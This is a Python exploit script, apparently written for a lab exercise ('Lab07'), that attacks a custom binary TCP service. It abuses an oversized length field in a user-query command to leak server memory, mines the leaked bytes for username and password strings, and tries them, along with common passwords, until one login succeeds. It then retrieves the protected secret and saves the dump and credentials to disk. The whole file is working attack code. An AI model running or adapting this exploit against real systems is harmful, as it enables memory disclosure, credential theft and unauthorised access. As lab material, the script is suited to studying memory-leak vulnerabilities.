#!/usr/bin/env python3
import socket, struct, sys, time, random, string, threading

"""
Low-pressure threaded exploit for Lab07.
This version:
  - Uses only 6 threads (safe for the remote server)
  - Each thread sleeps 0.15â€“0.35s between leaks
  - Smart filtering of candidate strings
  - Global cache of failed (user,pass) pairs
  - Stops immediately when one thread succeeds
"""


HOST = sys.argv[1]
PORT = int(sys.argv[2])

THREADS = 6                       # SAFE number of threads
LEAKS_PER_THREAD = 300            # steady but not overwhelming
LEAK_SIZE = 0xffe0                # slightly reduced leak size
BASE_SLEEP = 0.15
JITTER = 0.20

MIN_STR_LEN = 3
MAX_STR_LEN = 24
MAX_PAIR_GAP = 80

COMMON_PASSWORDS = [
    b"password", b"secret", b"1234", b"pass", b"admin"
]

FAILED = set()
FAILED_LOCK = threading.Lock()

RESULT = {
    "dump": None,
    "user": None,
    "pass": None,
    "secret": None
}
RESULT_LOCK = threading.Lock()
SUCCESS_FLAG = threading.Event()


def recvn(s, n):
    s.settimeout(2.0)
    buf = b""
    while len(buf) < n:
        try:
            chunk = s.recv(n - len(buf))
        except:
            break
        if not chunk:
            break
        buf += chunk
    return buf


def connect():
    s = socket.socket()
    s.connect((HOST, PORT))
    g = recvn(s, 1)
    if g != b'\x05':
        raise RuntimeError("Bad greeting")
    return s


def set_user(s, name):
    hdr = struct.pack("<BH", 0, len(name))
    s.sendall(hdr + name)
    if recvn(s, 1) != b'\x06': raise RuntimeError("SET_USER ack bad")
    echo = recvn(s, len(name))
    if echo != name: raise RuntimeError("SET_USER echo bad")


def try_pass(s, pw):
    hdr = struct.pack("<BH", 2, len(pw))
    s.sendall(hdr + pw)
    ack = recvn(s, 1)
    return ack == b'\x08'


def get_secret(user, pw):
    try:
        s = connect()
    except:
        return None
    try:
        set_user(s, user)
        if not try_pass(s, pw):
            s.close()
            return None

        # GET_SECRET
        s.sendall(struct.pack("<BH", 4, 0xffff))
        if recvn(s, 1) != b'\x0a':
            s.close()
            return None
        sec = recvn(s, 65535)
        s.close()
        return sec
    except:
        return None


def extract_strings(d):
    allowed = bytes(string.ascii_letters + string.digits, "ascii")
    out = []
    start = None
    for i, b in enumerate(d):
        if b in allowed:
            if start is None:
                start = i
        else:
            if start is not None:
                s = d[start:i]
                if MIN_STR_LEN <= len(s) <= MAX_STR_LEN and len(set(s)) > 2:
                    out.append((start, s))
                start = None
    return out


def build_candidates(d):
    s_list = extract_strings(d)
    s_list.sort(key=lambda x: x[0])
    cands = []

    # consecutive pairs
    for i in range(len(s_list) - 1):
        off1, s1 = s_list[i]
        off2, s2 = s_list[i+1]
        if 0 < off2 - off1 <= MAX_PAIR_GAP:
            cands.append((s1 + b'\x00', s2 + b'\x00'))

    # single strings with common passwords
    for off, s1 in s_list:
        for pw in COMMON_PASSWORDS:
            cands.append((s1 + b'\x00', pw + b'\x00'))

    # dedupe
    uniq = []
    seen = set()
    for u, p in cands:
        if (u, p) not in seen:
            seen.add((u, p))
            uniq.append((u, p))
    return uniq


def leak_once():
    try:
        s = connect()
    except:
        return None
    try:
        # attacker username
        u = b"A"*8 + b"\x00"
        set_user(s, u)

        # GET_USER
        hdr = struct.pack("<BH", 1, LEAK_SIZE)
        s.sendall(hdr)
        if recvn(s, 1) != b'\x06':
            s.close()
            return None
        dump = recvn(s, LEAK_SIZE)
        s.close()
        return dump
    except:
        return None


class Worker(threading.Thread):
    def __init__(self, idx):
        super().__init__()
        self.idx = idx

    def run(self):
        print(f"[T{self.idx}] started")
        for _ in range(LEAKS_PER_THREAD):
            if SUCCESS_FLAG.is_set():
                break

            d = leak_once()
            if not d or d.count(b"\x00") == len(d):
                time.sleep(BASE_SLEEP + random.random()*JITTER)
                continue

            cands = build_candidates(d)

            # filter out tried failures
            fresh = []
            with FAILED_LOCK:
                for (u, p) in cands:
                    if (u, p) not in FAILED:
                        fresh.append((u, p))

            if fresh:
                print(f"[T{self.idx}] {len(fresh)} new candidates")

            for (u, p) in fresh:
                if SUCCESS_FLAG.is_set(): break

                secret = get_secret(u, p)
                if secret:
                    # success!
                    with RESULT_LOCK:
                        if not SUCCESS_FLAG.is_set():
                            RESULT["dump"] = d
                            RESULT["user"] = u
                            RESULT["pass"] = p
                            RESULT["secret"] = secret
                            SUCCESS_FLAG.set()
                            print(f"[T{self.idx}] SUCCESS : {u!r} {p!r}")
                    break
                else:
                    with FAILED_LOCK:
                        FAILED.add((u, p))

            time.sleep(BASE_SLEEP + random.random()*JITTER)

        print(f"[T{self.idx}] exiting")


def main():
    print(f"[*] Running safe threaded exploit on {HOST}:{PORT}")
    workers = [Worker(i) for i in range(THREADS)]
    for w in workers: w.start()

    SUCCESS_FLAG.wait()  # wait for any thread to succeed

    for w in workers: w.join()

    if RESULT["user"]:
        print("[+] Exploit SUCCESS")
        print("[+] User:", RESULT["user"])
        print("[+] Pass:", RESULT["pass"])
        print("[+] Secret first bytes:", RESULT["secret"][:128])

        with open("success_dump.bin", "wb") as f:
            f.write(RESULT["dump"])
        with open("success_creds.txt", "w") as f:
            f.write(f"user={RESULT['user']!r}\npass={RESULT['pass']!r}\n")

        print("[+] Saved success_dump.bin and success_creds.txt")
    else:
        print("[!] No success")


if __name__ == "__main__":
    main()
